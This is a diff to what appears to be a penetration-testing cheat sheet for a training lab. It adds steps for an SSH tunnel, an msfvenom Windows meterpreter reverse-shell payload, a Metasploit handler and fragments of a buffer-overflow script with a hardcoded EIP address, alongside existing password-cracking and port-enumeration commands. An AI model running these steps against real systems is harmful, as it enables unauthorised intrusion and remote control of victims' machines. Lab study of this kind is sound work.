@@ -665,8 +665,18 @@ john --wordlist=Wordlist.txt shadowfile
     CLOSE DYNO
   Step 3. Port enumeration
     proxychains nc XXX.XXX.XXX.XXX PORT(s)#
-
-
+10. Build a tunnel using port 9999
+  ssh -p 3002 <username>@localhost -L 7777:XXX.XXX.XXX.XXX:9999 -NT
+11. Build Exploit
+  msfvenom -p windows/meterpreter/reverse_tcp  LHOST=10.50.22.28 LPORT=12345 -b '\x00' -f python             # IP Address of the linops machine and port must match meterpreter shell
+  meterpreter
+    use multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST 0.0.0.0
+    set LPORT 12345    # must match msfvenom shellcode
+  win_buf.py
+    eip "\xa0\x12\x50\x62"           # If your EIP doesn't work use this one
+    s.connect(("0.0.0.0", 7777))     # Target IP and port, we have a tunnel set up so use quad zeros and whatever port number you used in your tunnel
 
 
 
